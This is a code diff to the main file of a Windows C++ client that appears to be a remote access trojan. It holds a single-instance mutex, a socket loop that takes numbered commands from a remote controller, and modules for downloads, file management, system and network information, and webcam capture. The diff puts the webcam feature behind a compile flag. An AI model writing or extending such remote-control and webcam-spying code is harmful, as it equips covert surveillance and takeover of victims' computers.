@@ -4,11 +4,16 @@
 #include <string>
 #include <filesystem>
 #include "stream/Stream.h"
-#include "webcam/WebcamManager.h"
 #include "download/Download.h"
 #include "file/FileManager.h"
 #include "information/system/SystemInformation.h"
 #include "information/network/NetworkInformation.h"
+
+//////#define WEBCAM
+
+#ifdef WEBCAM
+    #include "webcam/WebcamManager.h"
+#endif
 
 // g++ -I
 // opencv/include
@@ -40,6 +45,8 @@
 
 
 int main() {
+
+
     HANDLE hMutexHandle = CreateMutex(nullptr, TRUE, reinterpret_cast<LPCSTR>(L"877a590a-a49a-489e-af04-666f5f98d5a7"));
     if (!(hMutexHandle == nullptr || GetLastError() == ERROR_ALREADY_EXISTS)) {
         WSADATA WSAData;
@@ -149,6 +156,7 @@ int main() {
                         break;
                     }
                     case 17: {
+                        #ifdef WEBCAM
                         std::cout << "START WEBCAM" << std::endl;
                         std::string webcamName = stream.readString();
                         bool fragmented = stream.readSize();
@@ -165,7 +173,9 @@ int main() {
                                 webcam.startWebcam();
                             }
                         }
+                        #endif
                         break;
+
                     }
                     default: {
                         connectionState = false;
@@ -173,10 +183,8 @@ int main() {
                     }
                 }
             }
-
             closesocket(sock);
         }
-
 
         WSACleanup();
     }
